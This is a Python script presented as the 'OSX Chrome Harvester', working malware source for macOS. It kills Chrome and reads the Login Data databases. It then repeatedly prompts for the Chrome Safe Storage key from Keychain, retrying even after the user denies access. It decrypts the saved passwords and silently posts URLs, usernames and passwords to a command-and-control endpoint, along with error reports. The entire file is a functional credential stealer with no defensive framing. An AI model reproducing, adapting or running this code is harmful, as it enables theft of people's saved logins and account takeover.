'''
 ██████╗ ███████╗██╗  ██╗                                                 
██╔═══██╗██╔════╝╚██╗██╔╝                                                 
██║   ██║███████╗ ╚███╔╝     █████╗                                       
██║   ██║╚════██║ ██╔██╗     ╚════╝                                       
╚██████╔╝███████║██╔╝ ██╗                                                 
 ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                 
                                                                          
 ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗                      
██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝                      
██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗                        
██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝                        
╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗                      
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝                      
                                                                          
██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗ 
██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Author: The Kernel Panic                                            
'''

import sqlite3
import os
import binascii
import subprocess
import base64
import sys
import hashlib
import glob
import time
import requests

C2_URL = "http://localhost:12345/receive_passwords"

# Terminate the first (main) running Chrome process
def terminate_chrome_process():
    try:
        chromepid = (
            subprocess.check_output("ps -A | grep Google\\ Chrome | awk '{print $1}'", shell=True)
            .decode('utf-8')
            .split()
        )
        if chromepid:
            subprocess.Popen(
                ['kill', "-9", chromepid[0]],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        time.sleep(1)
    except Exception as e:
        send_error_to_server(f"Error terminating Chrome process: {str(e)}", C2_URL)

# Get the paths of Chrome's Login Data file
def get_chrome_encrypted_passwords():
    try:
        paths = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Profile*/Login Data")
        if not paths:
            paths = glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Default/Login Data")
        return paths
    except Exception as e:
        send_error_to_server(f"Error getting Chrome Login Data paths: {str(e)}", C2_URL)
        return []  # Return empty list if error occurs, silently

# Get Chrome's Encryption Key from macOS Keychain
def get_chrome_storage_key():
    while True:
        try:
            key = (
                subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True)
                .strip()
                .replace(b"\"", b"")
            )
            if not key:
                raise ValueError("Chrome Safe Storage Key not found.")
            return key
        except Exception as e:
            send_error_to_server(f"Error getting Chrome Safe Storage Key: {str(e)}", C2_URL)
            time.sleep(5)  # If user clicks 'Deny', keep retrying every 5 seconds

# Decrypt the Chrome Encryption Key
def decrypt_chrome_key(encrypted_value, iv, key=None):
    try:
        hex_key = binascii.hexlify(key).decode('utf-8')
        hex_enc_password = base64.b64encode(encrypted_value[3:]).decode('utf-8')
        decrypted = subprocess.check_output(
            f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hex_key} <<< {hex_enc_password} 2>/dev/null", shell=True
        )
        return decrypted
    except Exception as e:
        send_error_to_server(f"Error decrypting password: {str(e)}", C2_URL)
        return "<Unable to decrypt>"

# Decrypt the passwords from the Login Data file
def decrypt_passwords(safe_storage_key, login_data):
    iv = "20" * 16
    key = hashlib.pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
    decrypted_entries = []
    try:
        fd = os.open(login_data, os.O_RDONLY)
        database = sqlite3.connect(f'/dev/fd/{fd}')
        os.close(fd)
        sql = 'SELECT username_value, password_value, origin_url FROM logins WHERE username_value != ""'
        with database:
            for user, encrypted_password, url in database.execute(sql):
                if encrypted_password[:3] == b'v10':
                    decrypted_entries.append((url, user, decrypt_chrome_key(encrypted_password, iv, key=key)))
    except Exception as e:
        send_error_to_server(f"Error decrypting passwords from database: {str(e)}", C2_URL)
    return decrypted_entries

# Send the decrypted passwords to C2
def send_decrypted_passwords_to_server(decrypted_data, server_url):
    try:
        data_to_send = []
        for entry in decrypted_data:
            entry_dict = {
                'url': entry[0],
                'username': entry[1],
                'password': entry[2].decode('utf-8', errors='ignore') if isinstance(entry[2], bytes) else entry[2]
            }
            data_to_send.append(entry_dict)

        # Send data as JSON
        response = requests.post(server_url, json={'passwords': data_to_send})

        if response.status_code != 200:
            send_error_to_server(f"Failed to send decrypted data. Status code: {response.status_code}, Response: {response.text}", server_url)

    except Exception as e:
        send_error_to_server(f"Error sending decrypted passwords to server: {str(e)}", server_url)

    # Exit silently
    sys.exit()

# Send errors to C2 
def send_error_to_server(error_message, server_url):
    try:
        response = requests.post(server_url, data={'error': error_message})
        if response.status_code != 200:
            pass 
    except Exception:
        pass  

def main():
    try:
        terminate_chrome_process()

        login_data = get_chrome_encrypted_passwords()  # Get the 'Login Data' file
        if not login_data:
            return  # Silently exit if no login data is found

        safe_storage_key = get_chrome_storage_key()  # Get Chrome Safe Storage / Encryption Key
        decrypted_passwords = []
        
        for profile in login_data:
            decrypted_passwords.extend(decrypt_passwords(safe_storage_key, profile))

        # Send decrypted passwords to the server without writing to disk
        send_decrypted_passwords_to_server(decrypted_passwords, C2_URL)
    
    except Exception as e:
        # Send errors to the server without writing to disk
        send_error_to_server(f"Critical error in main execution: {str(e)}", C2_URL)

if __name__ == "__main__":
    main()
